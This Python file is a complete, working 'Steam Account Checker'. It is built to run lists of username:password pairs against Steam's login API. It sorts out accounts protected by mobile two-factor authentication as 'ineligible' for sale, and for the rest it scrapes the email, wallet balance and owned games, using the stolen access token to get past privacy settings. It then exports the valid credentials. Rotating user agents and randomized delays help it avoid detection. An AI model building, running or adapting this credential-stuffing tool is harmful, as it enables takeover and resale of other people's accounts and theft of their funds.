#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import time
import random
import base64
import threading
import os
import xml.etree.ElementTree as ET
from datetime import datetime

try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from urllib.parse import parse_qs, urlparse
except ImportError:
    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
    from urlparse import parse_qs, urlparse


class SteamChecker:
    def __init__(self):
        self.results = []
        self.status = {
            "active": False,
            "total": 0,
            "checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 0,
            "ineligible_2fa": 0,
        }

    def make_session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": self.get_user_agent()})
        return s

    def get_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        ]
        return random.choice(agents)

    def rsa_encrypt(self, password, mod_hex, exp_hex):
        try:
            mod = int(mod_hex, 16)
            exp = int(exp_hex, 16)
            password_bytes = password.encode("utf-8")
            key_length = (mod.bit_length() + 7) // 8
            padding_length = key_length - len(password_bytes) - 3
            if padding_length < 8:
                padded = b"\x00\x02" + (b"\x01" * (key_length - len(password_bytes) - 3)) + b"\x00" + password_bytes
            else:
                random_bytes = os.urandom(padding_length)
                random_bytes = bytes(b if b != 0 else 1 for b in random_bytes)
                padded = b"\x00\x02" + random_bytes + b"\x00" + password_bytes
            padded_int = int.from_bytes(padded, "big")
            encrypted_int = pow(padded_int, exp, mod)
            encrypted_bytes = encrypted_int.to_bytes(key_length, "big")
            return base64.b64encode(encrypted_bytes).decode("utf-8")
        except Exception as e:
            print(f"RSA error: {e}")
            return None

    # ------------------------------------------------------------------
    # New Steam auth API (IAuthenticationService) — replaces dologin
    # ------------------------------------------------------------------

    def get_rsa_key(self, session, username):
        """New endpoint: GetPasswordRSAPublicKey"""
        try:
            resp = session.get(
                "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/",
                params={"account_name": username},
                timeout=15,
            )
            if resp.status_code == 200:
                data = resp.json().get("response", {})
                if data.get("publickey_mod"):
                    return data
        except Exception as e:
            print(f"  RSA key error: {e}")
        return None

    def begin_auth_session(self, session, username, enc_password, timestamp):
        """
        BeginAuthSessionViaCredentials.
        device_details is a nested protobuf and cannot be sent as JSON — omit it.
        platform_type 2 = WebBrowser (correct for a web-based checker).
        """
        try:
            resp = session.post(
                "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
                data={
                    "account_name": username,
                    "encrypted_password": enc_password,
                    "encryption_timestamp": str(timestamp),
                    "persistence": "1",
                    "platform_type": "2",
                    "website_id": "Community",
                },
                timeout=15,
            )
            print(f"  BeginAuth: {resp.status_code} | {resp.text[:300]}")
            if resp.status_code == 200:
                return resp.json().get("response", {})
            if resp.status_code == 400:
                # Wrong credentials → Steam returns 400 with EResult in body
                body = resp.text
                if "InvalidPassword" in body or "AccountNotFound" in body:
                    return {}   # empty dict → treated as invalid
            if resp.status_code == 429:
                return None   # rate limited → retry
        except Exception as e:
            print(f"  BeginAuth error: {e}")
        return None

    def poll_auth_session(self, session, client_id, request_id):
        """PollAuthSessionStatus — returns refresh_token and access_token when ready"""
        try:
            resp = session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
                data={"client_id": client_id, "request_id": request_id},
                timeout=15,
            )
            print(f"  Poll: {resp.status_code} | {resp.text[:200]}")
            if resp.status_code == 200:
                return resp.json().get("response", {})
        except Exception as e:
            print(f"  Poll error: {e}")
        return None

    def finalize_and_set_cookies(self, session, refresh_token, sessionid):
        """
        POST to finalizelogin, then transfer session cookies to all Steam domains.
        After this the session has valid steamLoginSecure cookies.
        """
        try:
            resp = session.post(
                "https://login.steampowered.com/jwt/finalizelogin",
                data={
                    "nonce": refresh_token,
                    "sessionid": sessionid,
                    "redir": "https://steamcommunity.com/login/home/?goto=",
                },
                timeout=15,
            )
            print(f"  Finalize: {resp.status_code} | {resp.text[:200]}")
            if resp.status_code != 200:
                return False
            data = resp.json()
            for transfer in data.get("transfer_info", []):
                url = transfer.get("url")
                params = transfer.get("params", {})
                if url:
                    try:
                        session.post(url, data=params, timeout=15)
                        print(f"  Transfer OK: {url}")
                    except Exception as e:
                        print(f"  Transfer error {url}: {e}")
            return True
        except Exception as e:
            print(f"  Finalize error: {e}")
        return False

    def get_owned_games(self, session, steamid64, access_token=None):
        """
        Primary: IPlayerService/GetOwnedGames with the access_token obtained during
        login — bypasses all privacy settings because we authenticate as the owner.
        Fallback: HTML page JS variable rgGames (works when library is public).
        """
        if not steamid64:
            print("  No steamid64 — cannot fetch games")
            return []

        # --- Primary: Steam Web API with access_token (ignores privacy) ---
        if access_token:
            try:
                url = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
                resp = session.get(url, params={
                    "access_token": access_token,
                    "steamid": steamid64,
                    "include_appinfo": "1",
                    "include_played_free_games": "1",
                }, timeout=20)
                print(f"  GetOwnedGames: {resp.status_code} | {resp.text[:120]}")
                if resp.status_code == 200:
                    data = resp.json().get("response", {})
                    games = [g["name"] for g in data.get("games", []) if g.get("name")]
                    print(f"  Found {len(games)} game(s) via GetOwnedGames API")
                    return games
            except Exception as e:
                print(f"  GetOwnedGames error: {e}")

        # --- Fallback: HTML page JS variable (public libraries only) ---
        try:
            url = f"https://steamcommunity.com/profiles/{steamid64}/games/?tab=all"
            print(f"  Fallback — HTML games page: {url}")
            resp = session.get(url, timeout=20)
            if resp.status_code == 200:
                idx = resp.text.find("var rgGames = ")
                if idx != -1:
                    start = resp.text.index("[", idx)
                    depth, end = 0, start
                    for i, ch in enumerate(resp.text[start:]):
                        if ch == "[": depth += 1
                        elif ch == "]": depth -= 1
                        if depth == 0:
                            end = start + i + 1
                            break
                    try:
                        games_data = json.loads(resp.text[start:end])
                        games = [g["name"] for g in games_data if g.get("name")]
                        print(f"  Found {len(games)} game(s) via HTML fallback")
                        return games
                    except Exception as e:
                        print(f"  HTML parse error: {e}")
                else:
                    print("  rgGames not in page (private library, no access_token)")
        except Exception as e:
            print(f"  HTML fallback error: {e}")

        return []

    def get_account_info(self, session, steamid64, access_token=None):
        email = "N/A"
        balance = "0.00"
        try:
            profile_url = (
                f"https://steamcommunity.com/profiles/{steamid64}"
                if steamid64
                else "https://steamcommunity.com/my/profile"
            )
            resp = session.get(profile_url, timeout=15, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                email_match = re.search(r"[\w.+-]+@[\w-]+\.[a-z]{2,}", html)
                email = email_match.group(0) if email_match else "N/A"
                balance_match = re.search(r"\$\s*([0-9]+\.[0-9]{2})", html)
                balance = balance_match.group(1) if balance_match else "0.00"
        except Exception as e:
            print(f"  Profile fetch error: {e}")
        games = self.get_owned_games(session, steamid64, access_token=access_token)
        return {"email": email, "balance": balance, "games": games}

    def check_account(self, username, password):
        """
        New Steam auth flow (IAuthenticationService):
          1. GetPasswordRSAPublicKey  → RSA key
          2. BeginAuthSessionViaCredentials → client_id, request_id, steamid, confirmations
          3. Check confirmation types for 2FA
          4. PollAuthSessionStatus → refresh_token
          5. finalizelogin → transfer cookies to all Steam domains
          6. Fetch games via /profiles/{steamid64}/games/?tab=all&xml=1
        """
        for attempt in range(3):
            try:
                session = self.make_session()
                sessionid = "".join(random.choices("0123456789abcdef", k=24))
                session.cookies.set("sessionid", sessionid, domain="steamcommunity.com")

                print(f"[{username}] Attempt {attempt + 1} — RSA key...")
                rsa = self.get_rsa_key(session, username)
                if not rsa:
                    time.sleep(2)
                    continue

                enc_pass = self.rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
                if not enc_pass:
                    return {"status": "error", "msg": "Encryption failed"}

                auth = self.begin_auth_session(session, username, enc_pass, rsa["timestamp"])
                if auth is None:
                    time.sleep(2)
                    continue

                # EResult != 1 means wrong credentials or banned
                # Steam returns HTTP 400 with {"response":{}} on bad credentials
                if not auth:
                    return {"status": "invalid", "msg": "Wrong username or password"}

                steamid64 = auth.get("steamid", "")
                client_id = auth.get("client_id", "")
                request_id = auth.get("request_id", "")
                confirmations = auth.get("allowed_confirmations", [])
                conf_types = {c.get("confirmation_type") for c in confirmations}

                print(f"[{username}] steamid={steamid64} conf_types={conf_types}")

                # confirmation_type meanings:
                # 1 = None needed  (no guard)
                # 2 = Email code   (Steam Guard email — still 1FA, eligible)
                # 3 = Device code  (Steam Guard Mobile — 2FA, ineligible)
                # 4 = Device confirmation (2FA, ineligible)
                if 3 in conf_types or 4 in conf_types:
                    return {"status": "valid_2fa", "msg": "Valid but 2FA is ON (ineligible)", "info": {}}

                # No 2FA — poll immediately for tokens
                poll = self.poll_auth_session(session, client_id, request_id)
                if not poll:
                    return {"status": "error", "msg": "Poll failed"}

                refresh_token = poll.get("refresh_token", "")
                access_token = poll.get("access_token", "")
                if not refresh_token:
                    return {"status": "error", "msg": "No refresh token from poll"}

                print(f"  access_token present: {bool(access_token)}")

                # Finalize login and transfer cookies to Steam domains
                self.finalize_and_set_cookies(session, refresh_token, sessionid)

                # Fetch account info and games — access_token bypasses privacy settings
                info = self.get_account_info(session, steamid64, access_token=access_token)
                return {"status": "valid", "msg": "Login OK", "info": info}

            except requests.exceptions.Timeout:
                print(f"[{username}] Timeout on attempt {attempt + 1}")
                if attempt == 2:
                    return {"status": "error", "msg": "Timeout"}
                time.sleep(3)
            except Exception as e:
                print(f"[{username}] Exception: {e}")
                if attempt == 2:
                    return {"status": "error", "msg": str(e)}
                time.sleep(2)

        return {"status": "error", "msg": "Max retries exceeded"}

    def run_check(self, credentials_list):
        self.status.update({
            "active": True,
            "total": len(credentials_list),
            "checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 0,
            "ineligible_2fa": 0,
        })
        self.results = []

        for line in credentials_list:
            if not self.status["active"]:
                break

            line = line.strip()
            if not line or ":" not in line:
                continue

            parts = line.split(":")
            username = parts[0].strip()
            password = ":".join(parts[1:]).strip()

            result = self.check_account(username, password)
            self.status["checked"] += 1

            if result["status"] == "valid":
                self.status["valid"] += 1
                info = result.get("info", {})
                games = info.get("games", [])
                entry = {
                    "username": username,
                    "password": password,
                    "status": "valid",
                    "message": f"Valid — {len(games)} game(s) | Balance: ${info.get('balance', '0.00')}",
                    "games": games,
                    "games_count": len(games),
                    "balance": info.get("balance", "0.00"),
                    "email": info.get("email", "N/A"),
                    "time": datetime.now().strftime("%H:%M:%S"),
                }

            elif result["status"] == "valid_2fa":
                # FIX #3: 2FA accounts are ineligible per platform rules
                self.status["ineligible_2fa"] += 1
                entry = {
                    "username": username,
                    "password": password,
                    "status": "valid_2fa",
                    "message": "Ineligible — 2FA is enabled (must disable to sell)",
                    "games": [],
                    "games_count": 0,
                    "balance": "N/A",
                    "email": "N/A",
                    "time": datetime.now().strftime("%H:%M:%S"),
                }

            elif result["status"] == "captcha":
                print("Captcha hit — pausing check.")
                self.status["active"] = False
                self.status["errors"] += 1
                entry = {
                    "username": username,
                    "password": password,
                    "status": "error",
                    "message": "Captcha required — check paused",
                    "games": [],
                    "games_count": 0,
                    "balance": "N/A",
                    "email": "N/A",
                    "time": datetime.now().strftime("%H:%M:%S"),
                }
                self.results.append(entry)
                break

            elif result["status"] == "rate_limited":
                self.status["errors"] += 1
                entry = {
                    "username": username,
                    "password": password,
                    "status": "error",
                    "message": "Rate limited",
                    "games": [],
                    "games_count": 0,
                    "balance": "N/A",
                    "email": "N/A",
                    "time": datetime.now().strftime("%H:%M:%S"),
                }

            elif result["status"] == "invalid":
                self.status["invalid"] += 1
                entry = {
                    "username": username,
                    "password": password,
                    "status": "invalid",
                    "message": result.get("msg", "Invalid credentials"),
                    "games": [],
                    "games_count": 0,
                    "balance": "N/A",
                    "email": "N/A",
                    "time": datetime.now().strftime("%H:%M:%S"),
                }

            else:
                self.status["errors"] += 1
                entry = {
                    "username": username,
                    "password": password,
                    "status": "error",
                    "message": result.get("msg", "Error"),
                    "games": [],
                    "games_count": 0,
                    "balance": "N/A",
                    "email": "N/A",
                    "time": datetime.now().strftime("%H:%M:%S"),
                }

            self.results.append(entry)
            time.sleep(random.uniform(1.5, 3.5))

        self.status["active"] = False
        print("Check complete.")


checker = None


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Steam Account Checker</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0e0e10;color:#c6d4df;min-height:100vh;padding:24px}
  .wrap{max-width:860px;margin:0 auto}
  h1{text-align:center;font-size:28px;margin-bottom:4px;color:#c7d5e0;letter-spacing:1px}
  .tagline{text-align:center;color:#5a7e93;font-size:13px;margin-bottom:28px}
  .card{background:#1b2838;border:1px solid #2a475e;border-radius:6px;padding:20px;margin-bottom:20px}
  label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:#5a7e93;margin-bottom:6px}
  textarea{width:100%;padding:10px;background:#101820;color:#c6d4df;border:1px solid #2a475e;border-radius:4px;height:130px;font-family:'Courier New',monospace;font-size:12px;resize:vertical}
  textarea:focus{outline:none;border-color:#66c0f4}
  .btns{display:flex;gap:10px;margin-top:14px;flex-wrap:wrap}
  .btn{cursor:pointer;font-weight:700;padding:10px 20px;border:none;border-radius:4px;font-size:13px;text-transform:uppercase;letter-spacing:.5px;transition:.2s}
  .btn-start{background:#4c9f47;color:#fff;flex:1}
  .btn-start:hover{background:#5cb85c}
  .btn-stop{background:#c62828;color:#fff;flex:1;display:none}
  .btn-stop:hover{background:#e53935}
  .btn-sec{background:#2a475e;color:#c6d4df;border:1px solid #3d6482}
  .btn-sec:hover{background:#3d6482}
  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:4px}
  .stat{background:#101820;border-radius:4px;padding:12px;text-align:center}
  .stat-num{font-size:26px;font-weight:700;margin-bottom:2px}
  .stat-lbl{font-size:10px;text-transform:uppercase;letter-spacing:.8px;color:#5a7e93}
  .n-total{color:#66c0f4}
  .n-valid{color:#4c9f47}
  .n-2fa{color:#e67e22}
  .n-invalid{color:#c62828}
  .prog-bar-wrap{background:#101820;border-radius:3px;height:6px;margin-top:14px;overflow:hidden}
  .prog-bar{height:6px;background:#66c0f4;border-radius:3px;transition:width .4s;width:0%}
  .results{max-height:420px;overflow-y:auto;background:#101820;border:1px solid #2a475e;border-radius:4px;padding:10px;margin-top:14px}
  .results::-webkit-scrollbar{width:6px}
  .results::-webkit-scrollbar-track{background:#0e0e10}
  .results::-webkit-scrollbar-thumb{background:#2a475e;border-radius:3px}
  .row{padding:10px 12px;margin:5px 0;border-radius:4px;font-size:12px;border-left:3px solid;line-height:1.6}
  .row-valid{background:#18302a;border-color:#4c9f47;color:#a8d5a2}
  .row-2fa{background:#2d2010;border-color:#e67e22;color:#f0a868}
  .row-invalid{background:#2a1515;border-color:#c62828;color:#d9827a}
  .row-error{background:#1f1f2a;border-color:#5a5a8a;color:#9090c0}
  .cred{font-family:'Courier New',monospace;font-weight:700;font-size:12px;color:inherit}
  .games-list{margin-top:5px;color:#8fa9be;font-size:11px}
  .games-list b{color:#66c0f4}
  .badge{display:inline-block;padding:2px 7px;border-radius:10px;font-size:10px;font-weight:700;margin-left:8px;vertical-align:middle;text-transform:uppercase}
  .badge-eligible{background:#1a4d1a;color:#4c9f47;border:1px solid #4c9f47}
  .badge-ineligible{background:#4d2000;color:#e67e22;border:1px solid #e67e22}
  .section-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:#5a7e93;margin-bottom:12px;border-bottom:1px solid #2a475e;padding-bottom:8px}
  .empty{text-align:center;color:#3d5a70;padding:30px;font-size:13px}
  input[type=file]{display:none}
</style>
</head>
<body>
<div class="wrap">
  <h1>⚗ Steam Checker</h1>
  <p class="tagline">Accounts with 2FA enabled are flagged ineligible — only 1FA accounts can be listed for sale</p>

  <div class="card">
    <label>Accounts (username:password, one per line)</label>
    <textarea id="creds" placeholder="user1:pass1&#10;user2:pass2&#10;user3:pass3"></textarea>
    <div class="btns">
      <button id="btnStart" class="btn btn-start" onclick="startCheck()">▶ Start Check</button>
      <button id="btnStop" class="btn btn-stop" onclick="stopCheck()">■ Stop</button>
      <button class="btn btn-sec" onclick="document.getElementById('fileInput').click()">⬆ Import .txt</button>
      <button class="btn btn-sec" onclick="exportValid()">⬇ Export Valid</button>
    </div>
    <input type="file" id="fileInput" accept=".txt" onchange="loadFile(event)">
    <div class="prog-bar-wrap"><div class="prog-bar" id="prog"></div></div>
  </div>

  <div class="card">
    <div class="section-title">Statistics</div>
    <div class="stats">
      <div class="stat"><div class="stat-num n-total" id="sTotal">0</div><div class="stat-lbl">Total</div></div>
      <div class="stat"><div class="stat-num n-valid" id="sValid">0</div><div class="stat-lbl">✓ Eligible</div></div>
      <div class="stat"><div class="stat-num n-2fa" id="s2fa">0</div><div class="stat-lbl">⚠ 2FA / Ineligible</div></div>
      <div class="stat"><div class="stat-num n-invalid" id="sInvalid">0</div><div class="stat-lbl">✗ Invalid</div></div>
    </div>
  </div>

  <div class="card">
    <div class="section-title">Results</div>
    <div class="results" id="results"><div class="empty">No results yet — paste accounts above and press Start</div></div>
  </div>
</div>

<script>
let timer = null;

function startCheck() {
  const creds = document.getElementById('creds').value.trim();
  if (!creds) { alert('Paste at least one account first.'); return; }
  fetch('/start', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({credentials: creds})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      document.getElementById('btnStart').style.display = 'none';
      document.getElementById('btnStop').style.display = 'block';
      timer = setInterval(poll, 1200);
      poll();
    } else { alert(d.message); }
  }).catch(() => alert('Could not reach server.'));
}

function stopCheck() {
  fetch('/stop', {method:'POST'}).then(r => r.json()).then(() => reset());
}

function reset() {
  document.getElementById('btnStart').style.display = 'block';
  document.getElementById('btnStop').style.display = 'none';
  clearInterval(timer);
}

function loadFile(e) {
  const f = e.target.files[0]; if (!f) return;
  const r = new FileReader();
  r.onload = ev => { document.getElementById('creds').value = ev.target.result; };
  r.readAsText(f);
}

function exportValid() {
  fetch('/results').then(r => r.json()).then(results => {
    const valid = results.filter(r => r.status === 'valid');
    if (!valid.length) { alert('No eligible accounts to export.'); return; }
    const lines = valid.map(r => {
      const games = r.games && r.games.length ? ` [${r.games.join(', ')}]` : '';
      return `${r.username}:${r.password}${games}`;
    });
    const blob = new Blob([lines.join('\n')], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url; a.download = 'valid_eligible.txt';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
  });
}

function poll() {
  Promise.all([
    fetch('/status').then(r => r.json()),
    fetch('/results').then(r => r.json())
  ]).then(([s, results]) => {
    document.getElementById('sTotal').textContent = s.total;
    document.getElementById('sValid').textContent = s.valid;
    document.getElementById('s2fa').textContent = s.ineligible_2fa;
    document.getElementById('sInvalid').textContent = s.invalid;

    const pct = s.total > 0 ? Math.round((s.checked / s.total) * 100) : 0;
    document.getElementById('prog').style.width = pct + '%';

    if (!s.active && s.total > 0) reset();

    const div = document.getElementById('results');
    if (!results.length) return;

    div.innerHTML = results.slice().reverse().map(r => {
      let cls = 'row-error', badge = '';
      if (r.status === 'valid') {
        cls = 'row-valid';
        badge = '<span class="badge badge-eligible">Eligible</span>';
      } else if (r.status === 'valid_2fa') {
        cls = 'row-2fa';
        badge = '<span class="badge badge-ineligible">2FA — Ineligible</span>';
      } else if (r.status === 'invalid') {
        cls = 'row-invalid';
      }

      let gamesHtml = '';
      if (r.games && r.games.length > 0) {
        const shown = r.games.slice(0, 10).join(', ');
        const more = r.games.length > 10 ? ` <b>+${r.games.length - 10} more</b>` : '';
        gamesHtml = `<div class="games-list">🎮 <b>${r.games.length} games:</b> ${shown}${more}</div>`;
      }

      let meta = '';
      if (r.status === 'valid') {
        meta = ` &nbsp;|&nbsp; Balance: <b>$${r.balance}</b>`;
        if (r.email && r.email !== 'N/A') meta += ` &nbsp;|&nbsp; ${r.email}`;
      }

      return `<div class="row ${cls}">
        <span class="cred">${r.username}:${r.password}</span>${badge}
        <br><small>${r.message}${meta} &nbsp;@&nbsp; ${r.time}</small>
        ${gamesHtml}
      </div>`;
    }).join('');
  });
}
</script>
</body>
</html>"""


def main():
    global checker
    checker = SteamChecker()

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = urlparse(self.path).path
            if path == "/" or path == "":
                self.reply_html(HTML_PAGE)
            elif path == "/status":
                self.reply_json(checker.status)
            elif path == "/results":
                self.reply_json(checker.results)
            else:
                self.send_response(404)
                self.end_headers()

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            path = urlparse(self.path).path

            if path == "/start":
                try:
                    data = json.loads(body.decode("utf-8"))
                    creds_raw = data.get("credentials", "").strip().split("\n")
                    creds = [c.strip() for c in creds_raw if c.strip() and ":" in c]
                    if not creds:
                        return self.reply_json({"success": False, "message": "No valid credentials found"})
                    if checker.status["active"]:
                        return self.reply_json({"success": False, "message": "Already running"})
                    t = threading.Thread(target=checker.run_check, args=(creds,))
                    t.daemon = True
                    t.start()
                    self.reply_json({"success": True, "message": f"Checking {len(creds)} accounts..."})
                except Exception as e:
                    self.reply_json({"success": False, "message": str(e)})

            elif path == "/stop":
                checker.status["active"] = False
                self.reply_json({"success": True})

            else:
                self.send_response(404)
                self.end_headers()

        def reply_html(self, html):
            b = html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def reply_json(self, data):
            b = json.dumps(data).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def log_message(self, fmt, *args):
            pass

    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(("127.0.0.1", port), Handler)
    print(f"Steam Checker running on http://127.0.0.1:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Stopped.")


if __name__ == "__main__":
    main()
